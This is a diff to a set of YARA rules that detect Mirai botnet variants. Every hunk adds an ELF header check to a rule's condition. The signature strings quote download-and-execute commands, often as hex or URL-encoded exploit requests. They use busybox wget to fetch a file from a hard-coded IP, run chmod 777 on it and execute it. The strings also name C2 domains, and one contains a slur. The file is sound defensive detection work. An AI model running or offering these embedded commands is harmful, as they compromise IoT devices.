@@ -23,6 +23,7 @@ rule Backdoor_Linux_Mirai_B_2147721642_0
         $n_1_9 = "GET /system.ini?loginuse&loginpas" ascii //weight: -1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (not (any of ($n*))) and
         (all of ($x*))
 }
@@ -54,6 +55,7 @@ rule Backdoor_Linux_Mirai_B_2147721642_1
         $x_1_11 = "Binded and listening on address %d.%d.%d.%d" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -75,6 +77,7 @@ rule Backdoor_Linux_Mirai_YA_2147740926_0
         $x_1_1 = {50 4f 53 54 20 2f 63 64 6e 2d 63 67 69 2f 00 00 20 48 54 54 50 2f 31 2e 31 0d 0a 55 73 65 72 2d 41 67 65 6e 74 3a 20 00 0d 0a 48 6f 73 74 3a}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -98,6 +101,7 @@ rule Backdoor_Linux_Mirai_C_2147740960_0
         $x_1_4 = "Bot deploy failed" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_5_*) and 2 of ($x_1_*))) or
             ((2 of ($x_5_*))) or
@@ -127,6 +131,7 @@ rule Backdoor_Linux_Mirai_AY_2147754433_0
         $x_1_5 = "aJPMOG" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -151,6 +156,7 @@ rule Backdoor_Linux_Mirai_AY_2147754433_1
         $x_1_4 = "scanlisten.sunless.network" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -179,6 +185,7 @@ rule Backdoor_Linux_Mirai_D_2147756987_0
         $x_1_8 = "telecomadmin" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_10_*) and 3 of ($x_1_*))) or
             ((1 of ($x_10_*) and 1 of ($x_2_*) and 1 of ($x_1_*))) or
@@ -208,6 +215,7 @@ rule Backdoor_Linux_Mirai_D_2147756987_1
         $x_1_5 = "backupmgt/localJob.php" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -232,6 +240,7 @@ rule Backdoor_Linux_Mirai_E_2147761157_0
         $x_1_4 = {00 20 9e e5 02 30 dc e7 03 30 20 e0 02 30 cc e7 00 10 9e e5 01 30 dc e7 03 30 26 e0 01 30 cc e7 00 20 9e e5 02 30 dc e7 03 30 25 e0 02 30 cc e7 00 10 9e e5 01 30 dc e7 03 30 24 e0 01 30 cc e7 04 20 de e5 01 30 d7 e5 01 c0 8c e2 03 24 82 e1 0c 00 52 e1 e9 ff ff ca f0 80 bd e8}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_2_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -259,6 +268,7 @@ rule Backdoor_Linux_Mirai_F_2147761158_0
         $x_1_4 = {47 45 54 20 2f 73 68 65 6c 6c 3f 63 64 25 32 30 2f 74 6d 70 3b 77 67 65 74 25 32 30 68 74 74 70 25 33 41 25 32 46 25 32 46 35 2e 32 30 36 2e 32 32 37 2e 32 32 38 25 32 46 6a 61 77 3b 73 68 25 32 30 6a 61 77 3b 20 48 54 54 50 2f 31 2e 30 0d 0a 0d 0a 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_2_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -286,6 +296,7 @@ rule Backdoor_Linux_Mirai_G_2147761159_0
         $x_1_4 = "%d.%d.%d.%d/bot.%s -O" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_2_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -314,6 +325,7 @@ rule Backdoor_Linux_Mirai_I_2147761774_0
         $x_1_5 = "killer_run" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -338,6 +350,7 @@ rule Backdoor_Linux_Mirai_K_2147761775_0
         $x_1_4 = "thiccnigga.me" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -364,6 +377,7 @@ rule Backdoor_Linux_Mirai_L_2147762520_0
         $x_1_6 = "/bin/hgcmegaco" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -391,6 +405,7 @@ rule Backdoor_Linux_Mirai_N_2147763162_0
         $x_1_7 = "scanner_init" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -417,6 +432,7 @@ rule Backdoor_Linux_Mirai_Aa_2147763163_0
         $x_1_6 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -440,6 +456,7 @@ rule Backdoor_Linux_Mirai_Ab_2147763217_0
         $x_1_3 = "/beastmode/b3astmode.mips;chmod 777 /tmp/bigH" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -464,6 +481,7 @@ rule Backdoor_Linux_Mirai_Ac_2147763447_0
         $x_1_4 = {68 2b 64 05 08 e8 f6 30 00 00 e8 ee 2d 00 00 66 c7 05 14 b3 05 08 02 00 a3 08 b3 05 08 c7 05 18 b3 05 08 41 de ca 35 66 c7 05 16 b3 05 08 00 50 e8 58 1f 00 00 c7 05 70 90 05 08 d0 eb 04 08 e8 59 fd ff ff e8 b4 06 00 00 58 5a 6a 20 8d ac 24 ac 05 00 00 55 e8 c3 2b 00 00 83 c4 10 83 fe 02 0f 84 98 00 00 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -488,6 +506,7 @@ rule Backdoor_Linux_Mirai_Ad_2147763448_0
         $x_1_4 = "/udpplain" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -513,6 +532,7 @@ rule Backdoor_Linux_Mirai_2147764081_0
         $x_1_4 = "Proximity-Killers" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -541,6 +561,7 @@ rule Backdoor_Linux_Mirai_2147764150_0
         $x_1_7 = "dnsflood" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -570,6 +591,7 @@ rule Backdoor_Linux_Mirai_2147764151_0
         $x_1_8 = "Killing pid %d" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (5 of ($x*))
 }
 
@@ -594,6 +616,7 @@ rule Backdoor_Linux_Mirai_2147764418_0
         $x_1_3 = "chmod +x dvrHelper; ./dvrHelper" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -622,6 +645,7 @@ rule Backdoor_Linux_Mirai_2147764419_0
         $x_1_4 = "udphex" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_5_*) and 2 of ($x_1_*))) or
             (all of ($x*))
@@ -646,6 +670,7 @@ rule Backdoor_Linux_Mirai_CA_2147766384_0
         $x_1_1 = {f0 40 2d e9 48 70 9f e5 00 20 97 e5 03 00 52 e3 40 60 9f e5 01 50 82 e2 21 4c a0 e1 21 c4 a0 e1 21 e8 a0 e1 ff 00 00 e2 f0 80 bd 08 05 30 a0 e3 93 02 02 e0 06 30 82 e0 06 00 c2 e7 00 50 87 e5 04 40 c3 e5 02 c0 c3 e5 03 e0 c3 e5 01 10 c3 e5 f0 80 bd e8}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -673,6 +698,7 @@ rule Backdoor_Linux_Mirai_CA_2147766384_1
         $x_1_7 = "adm1234intelecom" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_10_*) and 3 of ($x_1_*))) or
             (all of ($x*))
@@ -706,6 +732,7 @@ rule Backdoor_Linux_Mirai_CB_2147766396_0
         $x_1_10 = "MiraiIPRanges" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (5 of ($x*))
 }
 
@@ -730,6 +757,7 @@ rule Backdoor_Linux_Mirai_CC_2147766397_0
         $x_1_4 = {5b 6b 69 6c 6c 65 72 20 2f 20 [0-16] 5d 20 4b 69 6c 6c 65 64 3a 20 25 73}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -754,6 +782,7 @@ rule Backdoor_Linux_Mirai_CF_2147766625_0
         $x_2_4 = "/bin/busybox wget http://%d.%d.%d.%d/bot.%s -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.%s; >.b" ascii //weight: 2
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_1_*))) or
             ((1 of ($x_2_*))) or
@@ -781,6 +810,7 @@ rule Backdoor_Linux_Mirai_CE_2147766630_0
         $x_1_3 = "POST /tmBlock.cgi HTTP/1.1" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -805,6 +835,7 @@ rule Backdoor_Linux_Mirai_C_2147766841_0
         $x_1_4 = "anti_gdb_entry" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -830,6 +861,7 @@ rule Backdoor_Linux_Mirai_AH_2147767142_0
         $x_1_5 = "chmod +x %s; ./%s %s.update" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -854,6 +886,7 @@ rule Backdoor_Linux_Mirai_AJ_2147767616_0
         $x_1_4 = "chmod +x mpsl ; ./mpsl self.download" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -877,6 +910,7 @@ rule Backdoor_Linux_Mirai_AM_2147770142_0
         $x_2_3 = "Botnet Made By greek.Helios, and Thar3seller" ascii //weight: 2
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -904,6 +938,7 @@ rule Backdoor_Linux_Mirai_AN_2147770322_0
         $x_1_4 = "cnc.popsocketslive.com" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
             ((2 of ($x_2_*))) or
@@ -931,6 +966,7 @@ rule Backdoor_Linux_Mirai_AO_2147770323_0
         $x_2_3 = {63 64 20 2f 76 61 72 3b 20 72 6d 20 2d 72 66 20 6e 69 67 3b 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f 48 69 6c 69 78 2e 73 68 20 2d 4f 20 68 78 3b 20 63 68 6d 6f 64 20 37 37 37 20 68 78 3b 20 2e 2f 68 78}  //weight: 2, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
             ((2 of ($x_2_*))) or
@@ -960,6 +996,7 @@ rule Backdoor_Linux_Mirai_AS_2147771926_0
         $x_1_5 = "tcpattack" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -984,6 +1021,7 @@ rule Backdoor_Linux_Mirai_AZ_2147776665_0
         $x_1_4 = "/bin/busybox echo -en '%s' %s %s && /bin/busybox echo -en '\\x45\\x43\\x48\\x4f\\x44\\x4f\\x4e\\x45" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1009,6 +1047,7 @@ rule Backdoor_Linux_Mirai_B_2147781025_0
         $x_1_5 = "wget+http%3A%2F%2F179.43.149.189%2Fbins%2Flinksys.cloudbot%3B+chmod+777+linksys.cloudbot%3B+.%2Flinksys.cloudbot+linksys.cloudbot%60" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1033,6 +1072,7 @@ rule Backdoor_Linux_Mirai_BB_2147783870_0
         $x_1_4 = "B0TK1LL" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1056,6 +1096,7 @@ rule Backdoor_Linux_Mirai_2147784140_0
         $x_1_2 = {48 89 c1 40 0f b6 c6 89 c2 c1 e2 08 09 d0 48 98 48 89 c2 48 c1 e2 10 48 09 c2 48 89 d7 48 c1 e7 20 48 09 d7}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1080,6 +1121,7 @@ rule Backdoor_Linux_Mirai_2147784140_1
         $x_2_3 = {73 68 65 6c 6c 5f 65 78 65 63 26 76 61 72 73 5b 31 5d 5b 5d 3d 20 27 77 67 65 74 [0-4] 3a 2f 2f 31 38 35 2e 32 34 34 2e 32 35 2e 31 33 38 2f 54 72 69 6e 69 74 79 2e 78 38 36 20 2d 4f 20 2f 74 6d 70 2f 2e 6c 6f 6c 69 3b 20 63 68 6d 6f 64 20 37 37 37 20 2f 74 6d 70 2f 2e 6c 6f 6c 69}  //weight: 2, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_3_*))) or
             (all of ($x*))
@@ -1105,6 +1147,7 @@ rule Backdoor_Linux_Mirai_JK_2147784846_0
         $x_1_2 = {57 56 53 8b 5c 24 10 8b 43 0c 3b 43 10 7c ?? be dc 00 00 00 8b 13 bf 00 08 00 00 8d 4b 1c 89 f0 e8 fb 03 00 00 83 f8 00 89 c7 7f ?? 7d ?? 83 f8 fe 74 ?? e8 b8 01 00 00 f7 df 89 38}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1131,6 +1174,7 @@ rule Backdoor_Linux_Mirai_JK_2147784846_1
         $x_1_6 = "Moobot" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (5 of ($x*))
 }
 
@@ -1154,6 +1198,7 @@ rule Backdoor_Linux_Mirai_B_2147789137_0
         $x_1_3 = "KILLBOT" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1177,6 +1222,7 @@ rule Backdoor_Linux_Mirai_C_2147789138_0
         $x_1_3 = "209.141.61.135" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1201,6 +1247,7 @@ rule Backdoor_Linux_Mirai_D_2147789139_0
         $x_1_4 = {77 67 65 74 20 68 74 74 70 3a 2f 2f 90 02 15 2f 62 69 6e 64 2f 61 2e 73 68 20 2d 4f 20 2d 20 3e 20 6c 6f 6c 2e 73 68}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1227,6 +1274,7 @@ rule Backdoor_Linux_Mirai_E_2147789140_0
         $x_1_6 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((3 of ($x_1_*))) or
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
@@ -1255,6 +1303,7 @@ rule Backdoor_Linux_Mirai_F_2147789274_0
         $x_1_4 = "/bin/busybox chmod 777 * /tmp" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1282,6 +1331,7 @@ rule Backdoor_Linux_Mirai_F_2147789274_1
         $x_1_7 = ".hbot" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((4 of ($x_1_*))) or
             ((1 of ($x_2_*) and 2 of ($x_1_*))) or
@@ -1311,6 +1361,7 @@ rule Backdoor_Linux_Mirai_G_2147793506_0
         $x_1_5 = {6a 61 76 61 2e 6c 61 6e 67 2e 52 75 6e 74 69 6d 65 27 29 2e 67 65 74 4d 65 74 68 6f 64 73 28 29 5b 36 5d 2e 69 6e 76 6f 6b 65 28 6e 75 6c 6c 29 2e 65 78 65 63 28 27 63 64 20 2f 74 6d 70 3b 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f 66 65 74 63 68 2e 73 68 3b 63 68 6d 6f 64 20 37 37 37 20 66 65 74 63 68 2e 73 68 3b 73 68 20 66 65 74 63 68 2e 73 68}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_3_*) and 1 of ($x_1_*))) or
             ((2 of ($x_3_*))) or
@@ -1338,6 +1389,7 @@ rule Backdoor_Linux_Mirai_I_2147793754_0
         $x_1_3 = "scan1.firewalla1337.cc" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1364,6 +1416,7 @@ rule Backdoor_Linux_Mirai_I_2147793754_1
         $x_1_6 = "start-shell" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -1388,6 +1441,7 @@ rule Backdoor_Linux_Mirai_J_2147793893_0
         $x_1_4 = "VSzNC0CJti3ouku" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1411,6 +1465,7 @@ rule Backdoor_Linux_Mirai_J_2147793893_1
         $x_3_3 = "\\x45\\x43\\x48\\x4f\\x44\\x4f\\x4e\\x45" ascii //weight: 3
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1433,6 +1488,7 @@ rule Backdoor_Linux_Mirai_K_2147794268_0
         $x_1_2 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1456,6 +1512,7 @@ rule Backdoor_Linux_Mirai_R_2147796512_0
         $x_1_3 = "x8E/x9F/xD9/x81/x83/x99" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1480,6 +1537,7 @@ rule Backdoor_Linux_Mirai_L_2147797644_0
         $x_1_4 = "vstarcam2015" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1503,6 +1561,7 @@ rule Backdoor_Linux_Mirai_O_2147805199_0
         $x_1_3 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -1527,6 +1586,7 @@ rule Backdoor_Linux_Mirai_SC_2147808337_0
         $x_2_4 = "6SRS>B" ascii //weight: 2
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1551,6 +1611,7 @@ rule Backdoor_Linux_Mirai_AE_2147812787_0
         $x_2_4 = {0c 04 00 02 52 c2 44 02 0c 04 ff fb 53 c0 12 00 49 c1 44 81 0c 03 ff 83 57 c0 44 00 c0 02 02 80 00 00 00 ff c0 81 66 00 f1 76 0c 03 ff 84 57 c0 44 00 c4 00 42 80 10 02 c2 80 66 00 f1 62 0c 03 ff 86}  //weight: 2, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
             ((2 of ($x_2_*))) or
@@ -1579,6 +1640,7 @@ rule Backdoor_Linux_Mirai_H_2147812803_0
         $x_1_4 = "/tmp/mirai" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1608,6 +1670,7 @@ rule Backdoor_Linux_Mirai_S_2147813591_0
         $x_1_9 = "antihoney" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((3 of ($x_1_*))) or
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
@@ -1638,6 +1701,7 @@ rule Backdoor_Linux_Mirai_AI_2147814083_0
         $x_1_6 = "start_attack" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (5 of ($x*))
 }
 
@@ -1661,6 +1725,7 @@ rule Backdoor_Linux_Mirai_AB_2147814534_0
         $x_1_3 = "chmod 777 fdp" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1687,6 +1752,7 @@ rule Backdoor_Linux_Mirai_AE_2147814694_0
         $x_1_6 = "mdebung.Hi32" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -1711,6 +1777,7 @@ rule Backdoor_Linux_Mirai_SG_2147814696_0
         $x_1_4 = "./.akame" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1736,6 +1803,7 @@ rule Backdoor_Linux_Mirai_AA_2147814701_0
         $x_1_5 = "exe_kill" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -1759,6 +1827,7 @@ rule Backdoor_Linux_Mirai_Z_2147815382_0
         $x_1_3 = "tmp/monke -r /" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1784,6 +1853,7 @@ rule Backdoor_Linux_Mirai_AP_2147815668_0
         $x_1_5 = "[vega/table] tried to access table.%d but it is locked" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1808,6 +1878,7 @@ rule Backdoor_Linux_Mirai_U_2147815780_0
         $x_1_4 = "ackattack" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1832,6 +1903,7 @@ rule Backdoor_Linux_Mirai_AD_2147815784_0
         $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1856,6 +1928,7 @@ rule Backdoor_Linux_Mirai_AH_2147815785_0
         $x_1_4 = "attack.h" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1882,6 +1955,7 @@ rule Backdoor_Linux_Mirai_SZ_2147816091_0
         $x_1_6 = "/var/Sofia" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1906,6 +1980,7 @@ rule Backdoor_Linux_Mirai_AG_2147816101_0
         $x_1_4 = "Protecting your device from further infections." ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 2 of ($x_1_*))) or
             (all of ($x*))
@@ -1935,6 +2010,7 @@ rule Backdoor_Linux_Mirai_AJ_2147816822_0
         $x_1_6 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((4 of ($x_1_*))) or
             ((1 of ($x_2_*) and 2 of ($x_1_*))) or
@@ -1964,6 +2040,7 @@ rule Backdoor_Linux_Mirai_O_2147817484_0
         $x_1_5 = "xmhdipc" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1990,6 +2067,7 @@ rule Backdoor_Linux_Mirai_M_2147817517_0
         $x_1_6 = "attack_udp_vse" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2013,6 +2091,7 @@ rule Backdoor_Linux_Mirai_M_2147817517_1
         $x_1_3 = "black.fridgexperts.cc" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_5_*) and 1 of ($x_1_*))) or
             ((2 of ($x_5_*))) or
@@ -2042,6 +2121,7 @@ rule Backdoor_Linux_Mirai_AL_2147817828_0
         $x_1_5 = "lLjztqZ" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -2067,6 +2147,7 @@ rule Backdoor_Linux_Mirai_AM_2147817829_0
         $x_1_5 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -2091,6 +2172,7 @@ rule Backdoor_Linux_Mirai_AN_2147817830_0
         $x_1_4 = "4mw6hflnk3b5icde2joa" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -2115,6 +2197,7 @@ rule Backdoor_Linux_Mirai_AO_2147817832_0
         $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -2139,6 +2222,7 @@ rule Backdoor_Linux_Mirai_AK_2147817849_0
         $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_2_*) and 1 of ($x_1_*))) or
             ((3 of ($x_2_*))) or
@@ -2168,6 +2252,7 @@ rule Backdoor_Linux_Mirai_J_2147817927_0
         $x_1_5 = "[96mkiller" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -2193,6 +2278,7 @@ rule Backdoor_Linux_Mirai_Q_2147817928_0
         $x_1_5 = {63 75 72 6c 2b 2d 4f ?? ?? 68 74 74 70 [0-32] 2f 6c 6f 6c 6f 6c 2e 73 68}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -2219,6 +2305,7 @@ rule Backdoor_Linux_Mirai_P_2147817929_0
         $x_1_6 = "hunt5759" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (5 of ($x*))
 }
 
@@ -2242,6 +2329,7 @@ rule Backdoor_Linux_Mirai_P_2147817929_1
         $x_1_3 = "/bin/busybox chmod 777 * /tmp/" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2266,6 +2354,7 @@ rule Backdoor_Linux_Mirai_T_2147817976_0
         $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -2290,6 +2379,7 @@ rule Backdoor_Linux_Mirai_AX_2147818126_0
         $x_1_4 = "MIRAI" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2313,6 +2403,7 @@ rule Backdoor_Linux_Mirai_AU_2147818184_0
         $x_1_3 = "hlLjztqZ" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2335,6 +2426,7 @@ rule Backdoor_Linux_Mirai_AU_2147818184_1
